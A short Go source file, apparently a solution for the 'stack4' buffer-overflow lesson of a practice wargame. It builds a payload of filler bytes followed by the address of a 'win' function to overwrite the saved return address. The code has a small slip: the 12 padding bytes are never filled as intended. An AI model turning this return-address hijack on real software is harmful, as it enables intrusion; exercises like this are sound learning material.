package main

type stack4 struct {
}

func (s stack4) get_lesson_name() string {
	return "stack4"
}

func (s stack4) get_input_method() int {
	return inputPipe
}

func (s stack4) get_environment_key() string { return "" }

func (s stack4) get_input_data() []byte {
	/*
		I think I need to go from ESP (stack pointer/data) all the way to EIP.
	*/

	initialBuffer := make([]byte, 64)
	fill_byte_array(initialBuffer, '\xFF')

	extraBufferUntilEIP := make([]byte, 12)
	fill_byte_array(initialBuffer, '\xFF')

	/*
		Memory address found in the objdump:
		080483f4 <win>
	*/
	EIP := []byte{
		'\xf4',
		'\x83',
		'\x04',
		'\x08',
	}

	password := append(initialBuffer[:], extraBufferUntilEIP[:]...)
	password = append(password, EIP[:]...)

	return password
}
